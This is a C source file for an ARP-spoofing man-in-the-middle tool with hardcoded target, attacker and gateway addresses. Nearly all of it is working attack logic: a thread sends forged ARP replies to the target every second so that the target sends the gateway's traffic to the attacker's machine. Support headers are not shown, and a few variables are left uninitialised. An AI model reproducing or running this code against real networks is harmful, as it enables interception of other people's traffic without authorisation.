#include<unistd.h>
#include<pthread.h>
#include <sys/socket.h>
#include"common.h"
#include"arp.h"
#include"sniffer.h"
#include"getif.h"


bool debug=false;
void usage(){
	printf("MITM usage:\n"
		"  -h = show this help test\n"
		"  -d = increase debugging verbosity\n"
		"  -i = interface name\n"
		"  -l = list all available interface\n");
}
void* arp_spoof(void* info){
	MITM_info* m_info= (MITM_info*)info;
	if(debug){
		printf("======start arp spoof======\n");
		printf("dev is %s\n",m_info->dev);
		print_ip(m_info->TARGET_IP);
	}
	int p_tag_target;
       	p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
			m_info->TARGET_MAC,m_info->GATEWAY_IP,m_info->TARGET_IP,0);
	if(p_tag_target == -1){
		if(debug)printf("======arp spoof fail,return======\n");
		return NULL;
	}
	 while(1){
		p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->TARGET_MAC,
				 m_info->GATEWAY_IP,m_info->TARGET_IP,p_tag_target);
		if(p_tag_target == -1)break;
		usleep(1000000);
	}
	printf("======arp spoof fail,return======\n");
	return NULL;
}

int main(int argc,char* argv[]){
	int c ,exitcode;
	u_char ATTACKER_MAC[6];
	u_char TARGET_MAC[6]={0xd0,0xc5,0xd3,0x26,0x36,0x77};
	u_char GATEWAY_MAC[6];
	u_char ATTACKER_IP[4]={192,168,43,46};
	u_char TARGET_IP[4]={192,168,43,127};
	u_char GATEWAY_IP[4]={192,168,43,1};
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t* if_buf;
	char* usr_dev;
	bool get_dev;
	for(;;){
		c=getopt(argc, argv,"i:hdl");
		if(c < 0)break;
		switch(c){
			case 'h':
				usage();
				goto out;
			break;
			case 'd':
				debug=true;
			break;
			case 'i':
				usr_dev = optarg;
			break;
			case 'l':
				if(!if_buf){
					if(getifinfo(&if_buf,errbuf)){
						printf("can't get the device info"
                                                "please try by superuse angin\n");
                                        	return -1;
					}
				}
				while(if_buf->next){
                                                printf("%s\n",if_buf->name);
                                                if_buf = if_buf->next;
				}
				return 0;
			break;
			default:
		       		usage();
				goto out;	
		}
	}

	pthread_t t;
	//the thread of arp_spoof need to be detached or joinable?
	pthread_attr_t a;
	pthread_attr_init(&a);
	pthread_attr_setdetachstate(&a,PTHREAD_CREATE_DETACHED);
	
	if(getifinfo(&if_buf,errbuf)){
		printf("can get device info"
			"please run by superuser");
		return -1;
	}

	if(!checkdevice(if_buf,usr_dev)){
		printf("can't find spceify interface\n");
		return -1;
	}
	getAttackerMAC(usr_dev,ATTACKER_MAC);
	print_mac(ATTACKER_MAC);

        MITM_info info={
                .TARGET_MAC=TARGET_MAC,
                .ATTACKER_MAC=ATTACKER_MAC,
                .GATEWAY_MAC=GATEWAY_MAC,
                .TARGET_IP=TARGET_IP,
                .GATEWAY_IP=GATEWAY_IP,
        };
        strcpy(info.dev,usr_dev);
	/* init fake arp and the return value should be the next input to send_fake_arp op */
	pthread_create(&t,NULL,arp_spoof,&info);
	pthread_join(t,NULL);
	
	return 0;

out :
	return exitcode;
}
